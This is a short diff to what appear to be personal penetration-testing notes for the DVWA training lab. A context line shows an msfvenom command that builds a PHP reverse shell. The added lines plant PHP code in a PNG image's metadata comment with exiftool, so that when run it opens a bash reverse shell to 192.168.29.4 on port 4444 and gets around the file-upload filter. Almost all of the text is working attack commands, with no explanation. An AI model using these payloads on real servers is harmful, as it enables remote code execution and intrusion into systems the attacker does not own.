@@ -18,3 +18,8 @@ msfvenom -p php/reverse_php lport=4444 lhost=192.168.29.4 > ./php_reverse_shell.
 # Find shell into local system
 
 locate reverse | grep php
+
+
+# DVWA File Upload high
+
+exiftool -Comment="<?php \$command = '/bin/bash -c \"bash -i >& /dev/tcp/192.168.29.4/4444 0>&1\"'; \$output = shell_exec(\$command); echo \$output; ?>" dvwa_error.png
